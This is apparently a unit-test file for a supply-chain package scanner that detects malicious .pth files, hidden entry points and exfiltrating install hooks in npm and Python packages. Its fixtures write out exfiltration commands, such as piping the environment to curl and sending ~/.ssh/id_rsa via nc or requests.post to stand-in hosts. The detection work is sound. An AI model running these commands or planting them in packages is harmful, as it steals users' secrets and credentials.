"""Review findings 4, 7, 12 and the hook half of 13: what actually runs.

4. Text files outside the source extensions were dropped: .pth files in
   wheels (run at every interpreter start), an npm `main` pointing at
   lib/core.dat, extensionless `bin` scripts. Now .pth lines starting with
   `import` are SC-PTH-EXEC, main/bin/exports targets are scanned as JS
   whatever their extension, #! scripts are sniffed, and an entry point that
   cannot be read as text makes the scan INCOMPLETE.
7. install_script_risk only followed npm hooks and only knew JS network
   APIs: an sdist setup.py posting os.environ or ~/.ssh/id_rsa was OK.
12. Any directory starting with "test" demoted findings to INFO, even when
   main pointed into it.
13. Hook commands were matched by a regex that missed `node install`,
   `node --no-warnings x.js`, `cd scripts && node x.js`, `sh ./install.sh`,
   `./install.sh` and backslashes.
"""

import json
import unittest
from unittest import mock

from lazaret.registry import repo
from tests.registry._review_support import (
    DECODE_EXEC_JS, DECODE_EXEC_PY, ELF, EXFIL_JS, hooks, issues, manifest, scan_npm,
    scan_sdist, scan_wheel)

SH_EXFIL = "env | curl -s -X POST --data-binary @- https://webhook.site/0000-example\n"


class PthTests(unittest.TestCase):
    def test_pth_with_exec_is_critical(self):
        res = scan_wheel({"x/__init__.py": "", "evil.pth": DECODE_EXEC_PY.replace("\n", ";", 1)})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual([i["sev"] for i in issues(res, "SC-PTH-EXEC")], ["CRITICAL"])

    def test_plain_import_line_is_major(self):
        shim = ("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') "
                "== 'local'; enabled and __import__('_distutils_hack').add_shim();\n")
        res = scan_wheel({"distutils-precedence.pth": shim, "x/__init__.py": ""})
        self.assertEqual([i["sev"] for i in issues(res, "SC-PTH-EXEC")], ["MAJOR"])
        self.assertEqual(res["verdict"], "WARN")

    def test_path_only_pth_is_fine(self):
        res = scan_wheel({"x.pth": "src\n# comment\n", "x/__init__.py": ""})
        self.assertEqual(res["verdict"], "OK")

    def test_pth_issues_helper(self):
        found = repo.pth_issues("a.pth", "import sys\nlib\nimport os;exec('x')\n")
        self.assertEqual([(i["line"], i["sev"]) for i in found], [(1, "MAJOR"), (3, "CRITICAL")])


class EntryPointTests(unittest.TestCase):
    def test_main_with_a_data_extension_is_scanned_as_js(self):
        res = scan_npm({"package.json": manifest(main="lib/core.dat"), "lib/core.dat": DECODE_EXEC_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertIn("lib/core.dat", {i["file"] for i in issues(res, "SC-EVAL-DECODE")})

    def test_main_resolves_like_node(self):
        res = scan_npm({"package.json": manifest(main="./lib/core"), "lib/core/index.js": DECODE_EXEC_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_bin_and_exports_targets(self):
        res = scan_npm({"package.json": manifest(bin={"x": "bin/cli"}), "bin/cli": DECODE_EXEC_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        res = scan_npm({"package.json": manifest(exports={".": {"require": "./dist/x.cjs.txt",
                                                                "import": "./dist/x.mjs"}}),
                        "dist/x.cjs.txt": DECODE_EXEC_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_shebang_scripts_without_extension(self):
        res = scan_npm({"package.json": manifest(), "scripts/tool": "#!/usr/bin/env node\n" + DECODE_EXEC_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        res = scan_sdist({"setup.py": "", "bin/tool": "#!/usr/bin/env python3\n" + DECODE_EXEC_PY})
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_unreadable_entry_point_is_incomplete(self):
        blob = bytes((i * 7919) % 256 for i in range(4096))
        res = scan_npm({"package.json": manifest(main="lib/core.dat"), "lib/core.dat": blob})
        self.assertIn(res["verdict"], ("INCOMPLETE", "SUSPICIOUS"))
        self.assertTrue(any("runs at install/import time" in i["msg"] for i in issues(res, "SC-TRUNCATED")))

    def test_native_addon_main_is_not_incomplete(self):
        res = scan_npm({"package.json": manifest(main="build/x.node"), "build/x.node": ELF})
        self.assertEqual(res["verdict"], "WARN")

    def test_ordinary_text_files_are_not_scanned_or_incomplete(self):
        res = scan_npm({"package.json": manifest(), "README.md": DECODE_EXEC_JS, "data.json": "{}"})
        self.assertEqual(res["verdict"], "OK")


class PythonInstallScriptTests(unittest.TestCase):
    ENV_TO_WEBHOOK = ("import os, json, urllib.request\nfrom setuptools import setup\n"
                      "urllib.request.urlopen('https://webhook.site/0000', "
                      "data=json.dumps(dict(os.environ)).encode())\nsetup(name='x')\n")
    SSH_TO_IP = ("import os, requests\nfrom setuptools import setup\n"
                 "requests.post('http://192.0.2.1/c', data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n"
                 "setup(name='x')\n")
    ENV_TO_HOST = ("import os, json\nimport requests\nfrom setuptools import setup\n"
                   "requests.post('https://collector.invalid/c', json=dict(os.environ))\nsetup(name='x')\n")

    def test_setup_py_exfiltration_is_suspicious(self):
        for body in (self.ENV_TO_WEBHOOK, self.SSH_TO_IP, self.ENV_TO_HOST):
            with self.subTest(body=body[:40]):
                res = scan_sdist({"setup.py": body})
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
                hook = issues(res, "SC-INSTALL-HOOK")
                self.assertEqual([(i["file"], i["sev"]) for i in hook], [("setup.py", "CRITICAL")])

    def test_ordinary_setup_py_is_ok(self):
        body = ("import os\nfrom setuptools import setup\n"
                "setup(name='x', version=os.environ.get('X_VERSION', '1.0'))\n")
        self.assertEqual(scan_sdist({"setup.py": body})["verdict"], "OK")

    def test_in_tree_build_backend(self):
        pyproject = ('[build-system]\nrequires = []\nbuild-backend = "backend"\n'
                     'backend-path = ["_build"]\n')
        res = scan_sdist({"pyproject.toml": pyproject, "_build/backend.py": self.ENV_TO_WEBHOOK})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual({i["file"] for i in issues(res, "SC-INSTALL-HOOK")}, {"_build/backend.py"})

    def test_pep517_reader_without_tomllib(self):
        text = ('[project]\nname = "x"\n[build-system]\nbuild-backend = "pkg.api:backend"\n'
                'backend-path = [\n  "_b",\n  "src",\n]\n[tool.x]\ny = 1\n')
        self.assertEqual(repo._pep517_backend(text), ("pkg.api:backend", ["_b", "src"]))
        import builtins
        real_import = builtins.__import__

        def no_tomllib(name, *a, **kw):
            if name == "tomllib":
                raise ImportError(name)
            return real_import(name, *a, **kw)
        with mock.patch("builtins.__import__", no_tomllib):
            self.assertEqual(repo._pep517_backend(text), ("pkg.api:backend", ["_b", "src"]))

    def test_python_network_and_secret_patterns(self):
        self.assertTrue(repo.install_script_risk(self.ENV_TO_HOST))
        self.assertEqual(repo.install_script_risk(
            "import urllib.request\nurllib.request.urlretrieve('https://files.invalid/x.tgz', 'x')\n"), [])


class ShellRiskPrecisionTests(unittest.TestCase):
    """Shell network/environment patterns must not fire on ordinary JS."""

    def test_js_lookalikes_are_not_network_or_env(self):
        for text in ("var nc = 1;\nconst body = JSON.stringify(process.env);\n",
                     "function f(env) {\n  return env\n}\nfetch('https://registry.npmjs.org/x')\n",
                     "const curl = require('./curl');\nObject.keys(process.env);\n",
                     "env || true\ncurl -O https://files.invalid/x.tgz\n"):
            with self.subTest(text=text[:30]):
                self.assertEqual(repo.install_script_risk(text), [])

    def test_shell_exfiltration_shapes(self):
        for text in ("env | curl -s -X POST --data-binary @- https://collector.invalid/x\n",
                     "printenv > /tmp/e; curl -d @/tmp/e https://collector.invalid\n",
                     "cat ~/.ssh/id_rsa | nc collector.invalid 4444\n",
                     "curl --data \"$(env)\" -X POST https://collector.invalid\n",
                     "curl -s https://collector.invalid/x.sh | sh\n"):
            with self.subTest(text=text[:30]):
                self.assertTrue(repo.install_script_risk(text))


class TestPathTests(unittest.TestCase):
    BLOB = "const p = '" + "QUJD" * 150 + "';\n"

    def package(self, d):
        return {"package.json": json.dumps({"name": "x", "main": f"{d}/index.js"}),
                f"{d}/index.js": self.BLOB + "module.exports = require('./native.node');\n",
                f"{d}/native.node": ELF}

    def test_exact_test_dir_names_only(self):
        for path, expected in [("testkit/a.js", False), ("src/testing/a.js", True),
                               ("testutils/x.py", False), ("integration_tests/x.py", False),
                               ("tests/a.py", True), ("__tests__/a.js", True), ("spec/a.js", True),
                               ("lib/a.test.js", True), ("x_test.py", True), ("test_x.py", True),
                               ("pkg/test cases/x.sh", True), ("meson/unittests/t.py", True)]:
            with self.subTest(path=path):
                self.assertIs(repo.is_test_path(path), expected)

    def test_main_into_test_dir_is_not_demoted(self):
        for d in ("test", "testkit", "src/testing"):
            with self.subTest(dir=d):
                res = scan_npm(self.package(d))
                self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
                self.assertEqual({i["sev"] for i in res["issues"] if i["rule"] in ("SC-B64", "SC-BINARY")},
                                 {"MAJOR"})

    def test_unreachable_test_fixtures_are_still_inventory(self):
        files = self.package("test")
        files["package.json"] = manifest(main="index.js")
        files["index.js"] = "module.exports = 1;\n"
        res = scan_npm(files)
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])


class HookFollowingTests(unittest.TestCase):
    CASES = {
        "node install": ({"install.js": EXFIL_JS}, "node install"),
        "node --no-warnings install.js": ({"install.js": EXFIL_JS}, "node --no-warnings install.js"),
        "cd scripts && node x.js": ({"scripts/x.js": EXFIL_JS}, "cd scripts && node x.js"),
        "backslashes": ({"scripts/x.js": EXFIL_JS}, "node scripts\\x.js"),
        "sh ./install.sh": ({"install.sh": SH_EXFIL}, "sh ./install.sh"),
        "./install.sh": ({"install.sh": "#!/bin/sh\n" + SH_EXFIL}, "./install.sh"),
        "preload": ({"pre.js": EXFIL_JS, "main.js": "1;\n"}, "node -r ./pre.js main.js"),
        "env prefix": ({"a.js": EXFIL_JS}, "FOO=1 cross-env BAR=2 node a.js > log.txt 2>&1"),
        "non-js extension": ({"install.dat": EXFIL_JS}, "node install.dat"),
    }

    def test_hook_targets_are_followed(self):
        for label, (files, cmd) in self.CASES.items():
            with self.subTest(case=label):
                files = dict(files)
                files["package.json"] = hooks(postinstall=cmd)
                res = scan_npm(files)
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
                self.assertEqual(issues(res, "SC-INSTALL-HOOK")[0]["sev"], "CRITICAL")


    def test_unreadable_hook_target_is_incomplete(self):
        blob = bytes((i * 7919) % 256 for i in range(4096))
        res = scan_npm({"package.json": hooks(postinstall="node install.bin"), "install.bin": blob})
        self.assertEqual(res["verdict"], "INCOMPLETE")

    def test_binary_download_hook_stays_warn(self):
        res = scan_npm({"package.json": hooks(postinstall="node install.js"),
                        "install.js": ("const https = require('https');\n"
                                       "https.get('https://registry.npmjs.org/pkg-linux-x64/-/x.tgz');\n")})
        self.assertEqual(res["verdict"], "WARN")


if __name__ == "__main__":
    unittest.main()
